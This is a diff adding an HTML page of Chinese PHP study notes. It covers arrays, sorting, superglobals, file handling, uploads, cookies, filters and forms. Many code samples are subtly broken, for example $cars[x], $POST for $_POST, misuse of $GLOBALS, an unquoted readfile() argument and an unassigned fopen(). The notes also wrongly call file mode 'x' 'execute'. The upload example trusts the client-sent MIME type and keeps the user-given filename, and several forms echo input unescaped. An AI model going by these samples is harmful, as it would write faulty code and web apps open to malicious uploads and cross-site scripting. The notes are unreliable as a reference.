+$cars[1] &#x3D; &#39;b&#39;;
+$cars[2] &#x3D; &#39;c&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h4 id="获取数组的长度"><a href="#获取数组的长度" class="headerlink" title="获取数组的长度"></a>获取数组的长度</h4><ol>
+<li>count()函数，即返回元素个数<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    $cars&#x3D;array(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;);
+    echo count($cars); &#x2F;&#x2F;运行结果即为3
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h4 id="遍历索引函数"><a href="#遍历索引函数" class="headerlink" title="遍历索引函数"></a>遍历索引函数</h4><ol>
+<li>可以使用for循环遍历并输出索引数组的所有值<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    $cars&#x3D;array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);
+    $arrlength&#x3D;count($cars);
+
+    for($x&#x3D;0;$x &lt; $arrlength;$x++)&#123;
+        echo $cars[x];
+        echo &quot;&lt;br&gt;&quot;;
+    &#125;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h4 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组"></a>关联数组</h4><ol>
+<li>关联数组是使用分配给数组的指定键的数组<pre class="line-numbers language-none"><code class="language-none">$age&#x3D;array(&quot;bill&quot; &#x3D;&gt; &quot;35&quot;,&quot;steve&quot; &#x3D;&gt; &quot;36&quot;,&quot;elon&quot; &#x3D;&gt; &quot;37&quot;);
+等价于
+$age[&quot;bill&quot;]&#x3D;&quot;35&quot;;
+$age[&quot;steve&quot;]&#x3D;&quot;36&quot;;
+$age[&quot;elon&quot;]&#x3D;&quot;37&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li>语法：array(“键”=&gt;”值”,”键”=&gt;”值”);</li>
+</ol>
+<h5 id="遍历关联数组"><a href="#遍历关联数组" class="headerlink" title="遍历关联数组"></a>遍历关联数组</h5><ol>
+<li>使用foreach循环，遍历并输出关联数组的所有值<pre class="line-numbers language-none"><code class="language-none">foreach($age as $x&#x3D;&gt;$x_value)&#123;
+    echo &quot;key&#x3D;&quot;.$x.&quot;,value&#x3D;&quot;.$x_value;
+    echo &quot;&lt;br&gt;&quot;;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h2 id="数组排序"><a href="#数组排序" class="headerlink" title="数组排序"></a>数组排序</h2><h3 id="sort"><a href="#sort" class="headerlink" title="sort()"></a>sort()</h3><ol>
+<li>以升序对数组排序<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    $cars&#x3D;array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);
+    sort($cars);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="rsort"><a href="#rsort" class="headerlink" title="rsort()"></a>rsort()</h3><ol>
+<li>按照ascii码降序对数组进行排序,reverse的sort();<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    $cars&#x3D;array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);
+    rsort($cars);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="asort"><a href="#asort" class="headerlink" title="asort()"></a>asort()</h3><ol>
+<li>根据值对数组进行升序排序</li>
+<li>排序对象是关联数组，排序的根据是键值对的值<?php
+ $age=array("Bill"=>"63","Steve"=>"56","Elon"=>"47");
+ asort($age);
+?></li>
+</ol>
+<h3 id="ksort"><a href="#ksort" class="headerlink" title="ksort()"></a>ksort()</h3><ol>
+<li>根据键对关联数组进行排序</li>
+<li>排序对象是关联数组，排序的根据是键值对的键<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    $age&#x3D;array(&quot;Bill&quot;&#x3D;&gt;&quot;63&quot;,&quot;Steve&quot;&#x3D;&gt;&quot;56&quot;,&quot;Elon&quot;&#x3D;&gt;&quot;47&quot;);
+    ksort($age);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="arsort"><a href="#arsort" class="headerlink" title="arsort()"></a>arsort()</h3><ol>
+<li>根据值对关联数组进行降序排序</li>
+</ol>
+<h3 id="krsort"><a href="#krsort" class="headerlink" title="krsort()"></a>krsort()</h3><ol>
+<li>根据键对关联数组进行降序排序</li>
+</ol>
+<h2 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a><strong>超全局变量</strong></h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ol>
+<li>php中许多预定义变量都是超全局的，这意味着他们在一个脚本的全部作用域中都可用，无需执行global<pre class="line-numbers language-none"><code class="language-none">$GLOBALS
+$_SERVER
+$_REQUEST
+$_POST
+$_GET
+$_FILES
+$_ENV
+$_COOKIE
+$_SESSION<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h3><ol>
+<li>用于在PHP脚本中的任意位置访问全局变量</li>
+<li>PHP在名为$GLOBALS[index]的数组中存储了所有全局变量，变量的名字就是数组的键(逐一这个地方是数组的名字，是去掉$的数组名字再加上单引号括起来)<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    $x&#x3D;1;
+    $y&#x3D;2;
+    function addition() &#123;
+        $GLOBALS[&#39;$z&#39;] &#x3D; $GLOBALS[&#39;$x&#39;] + $GLOBALS[&#39;$y&#39;];
+    &#125;
+    addition();
+    echo $z;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="server"><a href="#server" class="headerlink" title="$_server"></a>$_server</h3><ol>
+<li>$_server这种超全局变量保存关于报头，路径和脚本位置的信息<pre class="line-numbers language-none"><code class="language-none">&lt;?php 
+echo $_SERVER[&#39;PHP_SELF&#39;];
+echo &quot;&lt;br&gt;&quot;;
+echo $_SERVER[&#39;SERVER_NAME&#39;];
+echo &quot;&lt;br&gt;&quot;;
+echo $_SERVER[&#39;HTTP_HOST&#39;];
+echo &quot;&lt;br&gt;&quot;;
+echo $_SERVER[&#39;HTTP_REFERER&#39;];
+echo &quot;&lt;br&gt;&quot;;
+echo $_SERVER[&#39;HTTP_USER_AGENT&#39;];
+echo &quot;&lt;br&gt;&quot;;
+echo $_SERVER[&#39;SCRIPT_NAME&#39;];
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li>$_server中访问的最重要的元素<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712002132.png"></li>
+<li>重要的<pre class="line-numbers language-none"><code class="language-none">$_server[&#39;REQUEST_METHOD&#39;];返回访问页面使用的请求方法，例如post和get
+$_server[&#39;SERVER_ADDR&#39;];返回当前脚本所在的服务器的IP地址
+$_server[&#39;PHP_SELF&#39;];返回当前执行脚本的文件名
+$_server[&#39;SERVER_NAME&#39;];返回当前运行脚本所在的服务器的主机名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h3><ol>
+<li>用于收集HTML表单提交的数据</li>
+<li>下面是一个包含输入字段和提交按钮的表单，当用户通过点击提交按钮来提交表单数据时，表单将发送到<form>标签的 action 属性中指定的脚本文件.</li>
+<li>在这个例子中，我们指定文件本身来处理表单数据。如果您需要使用其他的 PHP 文件来处理表单数据，请修改为您选择的文件名即可。然后，我们可以使用超级全局变量 $_REQUEST 来收集 input 字段的值：<pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;
+
+&lt;body&gt;
+
+&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];?&gt;&quot;&gt;
+Name: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;fname&quot;&gt;
+&lt;input type&#x3D;&quot;submit&quot;&gt;
+&lt;&#x2F;form&gt;
+
+&lt;?php 
+$name &#x3D; $_REQUEST[&#39;fname&#39;]; 
+echo $name; 
+?&gt;
+
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="post"><a href="#post" class="headerlink" title="$_post"></a>$_post</h3><ol>
+<li>广泛用于收集method=”post”的HTML表单后的表单数据<pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;
+&lt;body&gt;
+&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;]?&gt;&quot;&gt;
+Name: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;fname&quot;&gt;;
+&lt;input type&#x3D;&quot;submit&quot;&gt;;
+&lt;&#x2F;form&gt;
+
+&lt;?php
+    $name &#x3D; $POST[&#39;fname&#39;];
+    echo $name;
+?&gt;
+
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="get"><a href="#get" class="headerlink" title="$_get"></a>$_get</h3><ol>
+<li>用于提交HTML表单(method=”get”)之后的表单数据</li>
+<li>$GET 也可以收集URL中发送的数据</li>
+</ol>
+<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ol>
+<li>上面的$_POST和$_GET都是变量，类似于$GLOBAL,存储了脚本中的所有POST或者GET方法传入的参数</li>
+<li>使用方法和$GLOBAL类似<pre class="line-numbers language-none"><code class="language-none">echo $_GET[&quot;name&quot;];
+echo $_POST[&quot;age&quot;];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><ol>
+<li>$_GET是通过URL参数传递到当前脚本的变量数组</li>
+<li>$_POST是通过HTTP POST传递到当前脚本的变量数组</li>
+</ol>
+<h3 id="何时使用"><a href="#何时使用" class="headerlink" title="何时使用"></a>何时使用</h3><ol>
+<li>GET 方法从表单发送的信息对任何人都是可见的（所有变量名和值都显示在 URL 中）。GET 对所发送信息的数量也有限制。GET 可用于发送非敏感的数据。</li>
+<li>GET可以看见<strong>注入点</strong>（发送的信息的变量名）</li>
+<li>POST 方法从表单发送的信息对其他人是不可见的（所有名称/值会被嵌入 HTTP 请求的主体中）并且对所发送信息的数量也无限制。<h1 id="PHP文件处理"><a href="#PHP文件处理" class="headerlink" title="PHP文件处理"></a>PHP文件处理</h1><h2 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h2></li>
+<li>readfile()函数读取文件，并把它写入输出缓冲</li>
+<li>假设我们有一个名为 “webdictionary.txt” 的文本文件，存放在服务器上，就像这样：<pre class="line-numbers language-none"><code class="language-none">AJAX &#x3D; Asynchronous JavaScript and XML
+CSS &#x3D; Cascading Style Sheets
+HTML &#x3D; Hyper Text Markup Language
+PHP &#x3D; PHP Hypertext Preprocessor
+SQL &#x3D; Structured Query Language
+SVG &#x3D; Scalable Vector Graphics
+XML &#x3D; EXtensible Markup Language<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li>读取此文件并且写到输出流的PHP代码如下：读取成功则readfile()函数<strong>返回字节数</strong><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+echo readfile(webdictionary.txt);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen()"></a>fopen()</h2><ol>
+<li>提供比readfile()更多的选项</li>
+<li>fopen的第一个参数包含被打开的文件名，第二个参数规定打开文件的模式<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    $myfile&#x3D;fopen(&quot;webdictionary.txt&quot;,&quot;r&quot;) or die(&quot;unable to open file&quot;);
+    fclose($myfile);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h2 id="文件打开的模式"><a href="#文件打开的模式" class="headerlink" title="文件打开的模式"></a>文件打开的模式</h2><ol>
+<li>带+的读写都有<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220730140021.png"></li>
+<li>r读</li>
+<li>w重写</li>
+<li>a追加写</li>
+<li>x执行</li>
+</ol>
+<h2 id="fread"><a href="#fread" class="headerlink" title="fread()"></a>fread()</h2><ol>
+<li>fread()读取打开的文件</li>
+<li>fread()的第一个参数包含待读取文件的文件名，第二个参数规定待读取的最大字节数</li>
+</ol>
+<h2 id="fclose"><a href="#fclose" class="headerlink" title="fclose()"></a>fclose()</h2><ol>
+<li>fclose()函数用于关闭打开的文件</li>
+<li>用完文件后把它们全部关闭是一个良好的编程习惯。您并不想打开的文件占用您的服务器资源。</li>
+<li>fclose需要待关闭的文件的名称，或者存有文件名的变量</li>
+</ol>
+<h2 id="fgets"><a href="#fgets" class="headerlink" title="fgets()"></a>fgets()</h2><ol>
+<li>fgets()函数用于从文件中读取单行</li>
+<li>调用fgets()函数之后，文件指针会移动到下一行</li>
+</ol>
+<h2 id="feof"><a href="#feof" class="headerlink" title="feof()"></a>feof()</h2><ol>
+<li>feof()函数检查是否已经到达end of file</li>
+<li>feof()对于遍历未知长度的数据很有用<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+$myfile&#x3D;fopen(&quot;a.txt&quot;,&quot;r&quot;) or die(&quot;unable to open file&quot;);
+while(!feof($myfile))&#123;
+    echo fgets($myfile).&lt;br&gt;;
+&#125;
+fclose($myfile);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h2 id="fgetc"><a href="#fgetc" class="headerlink" title="fgetc()"></a>fgetc()</h2><ol>
+<li>fgetc()函数用于从文件中读取单个字符<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    fopen(&quot;a.txt&quot;,&quot;r&quot;) or die(&quot;unable&quot;);
+    while(!feof($myfile))&#123;
+        echo fgetc($myfile);
+    &#125;
+    fclose($myfile);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h2 id="fopen-1"><a href="#fopen-1" class="headerlink" title="fopen()"></a>fopen()</h2><ol>
+<li>fopen()函数用于创建文件</li>
+<li>在php中，创建文件所用的函数和打开文件的相同</li>
+<li>如果fopen()没有遍历到文件，就会创建一个文件<pre class="line-numbers language-none"><code class="language-none">$myfile&#x3D;fopen(&quot;a.txt&quot;,&quot;w&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ol>
+<h2 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite()"></a>fwrite()</h2><ol>
+<li>fwrite()函数用于写入文件</li>
+<li>fwrite()的第一个参数包含要写入的文件的文件名，第二个参数是被写的字符串<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+$myfile&#x3D;fopen(&quot;newfile.txt&quot;,&quot;w&quot;) or die(&quot;unable&quot;);
+$txt&#x3D;&quot;a&quot;;
+fwrite($myfile,$txt);&#x2F;&#x2F;写a
+$txt&#x3D;&quot;b&quot;;
+fwrite($myfile,$txt);&#x2F;&#x2F;写b
+fclose($myfile);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h1 id="PHP文件上传"><a href="#PHP文件上传" class="headerlink" title="PHP文件上传"></a>PHP文件上传</h1><h2 id="创建一个文件上传表单"><a href="#创建一个文件上传表单" class="headerlink" title="创建一个文件上传表单"></a>创建一个文件上传表单</h2><pre class="line-numbers language-none"><code class="language-none">&lt;form action&#x3D;&quot;upload_file.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&#39;multipart&#x2F;form-data&#39;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ol>
+<li>&lt;\form&gt;标签的enctype属性规定了在提交表单时要使用哪种内容类型，在表单需要使用二进制数据时，比如文件内容，请使用”multipart/form-data”</li>
+<li>&lt;\input&gt;标签的type=”file”属性规定了应该把输入作为文件来处理，举例来说，当在浏览器中预览时，会看到输入框旁边有一个浏览按钮。</li>
+</ol>
+<h2 id="创建上传脚本"><a href="#创建上传脚本" class="headerlink" title="创建上传脚本"></a>创建上传脚本</h2><ol>
+<li>upload_file.php文件含有供文件上传的代码</li>
+<li>通过使用PHP的全局数组$_FILE，可以从客户端计算机向远程服务器上传文件</li>
+</ol>
+<h3 id="FILES"><a href="#FILES" class="headerlink" title="$_FILES"></a>$_FILES</h3><ol>
+<li>第一个参数是input name</li>
+<li>第二个下标可以是name type size tmp_name error<pre class="line-numbers language-none"><code class="language-none">$_FILES[&quot;file&quot;][&quot;name&quot;] 被上传文件的名称
+$_FILES[&quot;file&quot;][&quot;type&quot;] 被上传的文件类型
+$_FILES[&quot;file&quot;][&quot;size&quot;] 被上传的文件大小，以字节计算
+$_FILES[&quot;file&quot;][&quot;tmp_name&quot;] 存储在服务器的文件的临时副本名称
+$_FILES[&quot;file&quot;][&quot;error&quot;] 由文件上传导致的错误代码
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li>总之$_FILES超全局变量的作用就是用来上传文件的</li>
+</ol>
+<h2 id="设置上传限制"><a href="#设置上传限制" class="headerlink" title="设置上传限制"></a>设置上传限制</h2><ol>
+<li>只能上传gif或者jpeg文件<pre class="line-numbers language-none"><code class="language-none">if((($_FILES[&#39;file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;) || $_FILES[&#39;file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39; || $_FILES[&#39;file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;pjpeg&#39;)) &amp;&amp; ($_FILES[&#39;file&#39;][&#39;size&#39;] &lt; 20000&gt;))
+&#123;
+    if($_FILES[&#39;file&#39;][&#39;error&#39;] &gt; 0) &#x2F;&#x2F; 这个地方如果为error则错误代码&gt;0
+    &#123;
+        echo &quot;ERROR&quot; . $_FILES[&#39;file&#39;][&#39;error&#39;] . &quot;&lt;br &#x2F;&gt;&quot;
+    &#125;
+    else&#123;
+        echo &quot;UPLOAD-name&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &lt;br &#x2F;&gt;
+        echo &quot;Type&quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &lt;br &#x2F;&gt;
+        echo &quot;Size&quot; . $_FILES[&#39;file&#39;][&#39;size&#39;] . &quot;byte&quot; . &lt;br &#x2F;&gt;
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h2 id="保存被上传的文件"><a href="#保存被上传的文件" class="headerlink" title="保存被上传的文件"></a>保存被上传的文件</h2><ol>
+<li>上面的例子在服务器的PHP临时文件夹中创建了一个临时副本</li>
+<li>这个临时副本会在脚本结束时消失，要保存被上传的文件，我们需要把它拷贝到另外的位置<pre class="line-numbers language-none"><code class="language-none">if(file_exists(&quot;upload&#x2F;&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123;
+    echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;already exists.&quot;;
+&#125;
+else&#123;
+    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload&#x2F;&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);
+    echo &quot;stored in:&quot; . &quot;upload&#x2F;&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li>上面的脚本检测了是否已经存在了此文件，如果不存在，则把文件拷贝到指定的文件夹</li>
+<li>file_exists() 检测在指定目录下是否有文件名的文件存在</li>
+<li>move_uploaded_file() 移动文件</li>
+</ol>
+<h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><h2 id="什么是cookie"><a href="#什么是cookie" class="headerlink" title="什么是cookie"></a>什么是cookie</h2><ol>
+<li>cookie常用于识别用户，cookie是服务器留在用户计算机中的小文件，每当相同的计算机通过浏览器请求页面时，它同时会发送cookie.通过php,您能够创建并取回cookie的值</li>
+<li>注意一定是服务器留在用户计算机中的，服务器-&gt;用户计算机</li>
+</ol>
+<h2 id="创建cookie"><a href="#创建cookie" class="headerlink" title="创建cookie"></a>创建cookie</h2><ol>
+<li>setcookie()函数用来设置cookie</li>
+<li>setcookie()函数必须位于&lt;\html&gt;标签之前<pre class="line-numbers language-none"><code class="language-none">setcookie(name,value,expire,path,domain)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>创建用户名为user的cookie，将它赋值为alex port，规定在一小时后过期<pre class="line-numbers language-none"><code class="language-none">&lt;?php 
+    setcookie(&quot;user&quot;,&quot;alex port&quot;,time()+3600);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
+<li>在发送cookie时，cookie的值会自动进行URL编码，在取回时自动解码</li>
+<li>为了防止URL编码，使用setrawcookie()函数取代，set 设置,raw 生的，没有改变进行URL编码的cookie</li>
+</ol>
+<h2 id="取回cookie的值"><a href="#取回cookie的值" class="headerlink" title="取回cookie的值"></a>取回cookie的值</h2><ol>
+<li>$_COOKIE超全局变量用于取回cookie的值</li>
+<li>取回名为user的cookie值，并且显示<pre class="line-numbers language-none"><code class="language-none">echo $_COOKIE[&#39;user&#39;];<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>使用isset()函数来确认是否已经设置了cookie<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    if(isset($_COOKIE[&quot;user&quot;]))
+        echo &quot;welcome&quot; . $_COOKIE[&#39;user&#39;] . &lt;br &#x2F;&gt;
+    else
+        echo &quot;welcome guest&quot; . &lt;br &#x2F;&gt;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h2 id="删除cookie"><a href="#删除cookie" class="headerlink" title="删除cookie"></a>删除cookie</h2><ol>
+<li>当删除cookie时，应该使用过期日期变更为过去的时间点</li>
+<li>如果过期日期在过去的时间点，则认为过去已经过期<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    setcookie(&quot;user&quot;,&quot;&quot;,time()-3600);&#x2F;&#x2F;默认为cookie的名称为user,值为空，时间在过去一个小时的时候已经过期
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h1 id="php错误处理"><a href="#php错误处理" class="headerlink" title="php错误处理"></a>php错误处理</h1><h2 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h2><ol>
+<li>在php中，默认的错误处理很简单，一条消息会被发送到浏览器，这条消息带有文件名，行号，以及一条错误的信息</li>
+</ol>
+<h2 id="php错误处理-1"><a href="#php错误处理-1" class="headerlink" title="php错误处理"></a>php错误处理</h2><ol>
+<li>在创建脚本和web应用程序时，错误处理是一个重要的部分。</li>
+</ol>
+<h2 id="基本的错误处理：使用die-函数"><a href="#基本的错误处理：使用die-函数" class="headerlink" title="基本的错误处理：使用die()函数"></a>基本的错误处理：使用die()函数</h2><ol>
+<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220802155519.png"></li>
+<li>die()函数的错误处理机制，在错误之后终止了脚本</li>
+</ol>
+<h1 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ol>
+<li>PHP过滤器用于验证和过滤来自非安全来源的数据</li>
+<li>验证和过滤用户输入或自定义是任何web应用程序的重要组成部分</li>
+</ol>
+<h2 id="为什么使用过滤器"><a href="#为什么使用过滤器" class="headerlink" title="为什么使用过滤器"></a>为什么使用过滤器</h2><ol>
+<li>几乎所有的web应用程序都依赖外部的输入，这些数据通常都来自用户或其它应用程序</li>
+<li>使用过滤器，能确保所有应用程序都获得正确的输入类型</li>
+</ol>
+<h2 id="什么是外部数据？"><a href="#什么是外部数据？" class="headerlink" title="什么是外部数据？"></a>什么是外部数据？</h2><pre class="line-numbers language-none"><code class="language-none">
+来自表单的输入数据
+Cookies
+服务器变量
+数据库查询结果
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="函数和过滤器"><a href="#函数和过滤器" class="headerlink" title="函数和过滤器"></a>函数和过滤器</h2><ol>
+<li>如果需要过滤变量，使用以下的过滤器函数之一<pre class="line-numbers language-none"><code class="language-none">filter_var() 通过一个指定的过滤器来过滤单一的变量
+filter_var_array() 通过相同的或不同的过滤器来过滤多个变量
+filter_input() 获取一个输入变量，并对它进行过滤
+filter_input_array() 获取多个输入变量，并通过相同的或不同的过滤器对他们进行过滤<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/php_ref_filter.asp">https://www.w3school.com.cn/php/php_ref_filter.asp</a>  php-filter函数</li>
+</ol>
+<h1 id="PHP表单"><a href="#PHP表单" class="headerlink" title="PHP表单"></a>PHP表单</h1><h2 id="PHP表单处理"><a href="#PHP表单处理" class="headerlink" title="PHP表单处理"></a>PHP表单处理</h2><pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;
+&lt;body&gt;
+&lt;form action&#x3D;&#39;welcome.php&#39; method&#x3D;&#39;post&#39;&gt;
+Name: &lt;input type&#x3D;&#39;text&#39; name&#x3D;&#39;name&#39;&gt;&lt;br&gt;
+E-mail: &lt;input type&#x3D;&#39;text&#39; name&#x3D;&#39;email&#39;&gt;&lt;br&gt;
+&lt;input type&#x3D;&#39;submit&#39;&gt;
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ol>
+<li>用户填写此表单并点击提交按钮后，表单数据会发送到名为welcome.php的文件供处理，表单数据是通过HTTP POST的方式发送的</li>
+<li>如需显示出被提交的数据，您可以简单地输出（echo）所有变量。”welcome.php” 文件是这样的：<pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;
+&lt;body&gt;
+welcome &lt;?php echo $_POST[&quot;name&quot;];?&gt;&lt;br&gt;
+your email address is: &lt;?php echo $_POST[&quot;email&quot;]?&gt;&lt;br&gt;
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h2 id="表单验证"><a href="#表单验证" class="headerlink" title="表单验证"></a>表单验证</h2><h3 id="文本字段"><a href="#文本字段" class="headerlink" title="文本字段"></a>文本字段</h3><pre class="line-numbers language-none"><code class="language-none">Name: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&#39;name&#39;&gt;
+E-mail: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&#39;email&#39;&gt;
+website: &lt;input type&#x3D;&#39;text&#39; name&#x3D;&#39;website&#39;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h3 id="单选按钮"><a href="#单选按钮" class="headerlink" title="单选按钮"></a>单选按钮</h3><ol>
+<li>gender字段是单选按钮,其中，radio的type类型是单选框<pre class="line-numbers language-none"><code class="language-none">gender:
+&lt;input type&#x3D;&#39;radio&#39; name&#x3D;&#39;gender&#39; value&#x3D;&#39;female&#39;&gt; female
+&lt;input type&#x3D;&#39;radio&#39; name&#x3D;&#39;gender&#39; value&#x3D;&#39;male&#39;&gt; male<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="表单元素"><a href="#表单元素" class="headerlink" title="表单元素"></a>表单元素</h3><pre class="line-numbers language-none"><code class="language-none">&lt;form method&#x3D;&#39;post&#39; action&#x3D;&quot;&lt;?php echo htmlspecialchars($_SERVER[&quot;PHP_SELF&quot;]);?&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<ol>
+<li>当提交此表单时，通过method=’post’发送表单数据</li>
+</ol>
